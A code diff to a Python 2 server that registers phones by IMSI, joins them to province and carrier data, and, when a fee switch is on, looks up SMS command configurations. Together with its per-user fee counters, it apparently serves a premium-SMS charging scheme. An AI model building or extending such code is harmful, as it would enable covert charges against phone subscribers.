@@ -77,7 +77,7 @@ def get_imsi_register_response(_imsi):
     _return = "";
     _imsi=filter(str.isdigit, _imsi)
     dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
-    _sql = 'SELECT id,imsi,mobile,matchCount FROM `imsi_users` WHERE imsi = %s '
+    _sql = 'SELECT id,imsi,mobile,matchCount,mobile_areas.province,mobile_areas.city,mobile_areas.mobileType,lastCmdTime,cmdFeeSum,cmdFeeSumMonth FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,\'8612345678901\'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  %s '
     _recordRsp = dbConfig.get(_sql, _imsi) 
     if _recordRsp==None:
         _sql = 'insert into `imsi_users` (imsi,insertTime) value (%s,%s)'
@@ -89,9 +89,31 @@ def get_imsi_register_response(_imsi):
     else:
         if len(str(_recordRsp['mobile']))<=10 and match_flow_control() and int(_recordRsp['matchCount'])<int(get_system_parameter_from_db("matchLimitPerImsi")):
             _return = MATCH_CONTENT.replace('[id]', str(_recordRsp['id'])).replace('[mobile]', get_system_parameter_from_db("matchMobile")) 
+            # todo move to threading
             _sql = "update imsi_users set matchCount=matchCount+1 where imsi=%s" 
             dbConfig.update(_sql,_imsi)
+        else:
+            if get_system_parameter_from_db('openFee') == 'open' :
+                get_cmd(_recordRsp)
+
+
     return _return
+
+def get_cmd(_user):
+    if _user['province']!=None and len(_user['province']) > 0:
+        print str(_user)
+        dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
+        _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s '
+        _record = dbConfig.get(_sql, _user['province'],_user['mobileType']) 
+        if _record == None:
+            return None
+        else:
+            print str(_record)
+            return _record
+    else:
+        print 'can not match province'+str(_user)
+        return None
+
 
 def get_system_parameter_from_db(_title):
     _return = '';
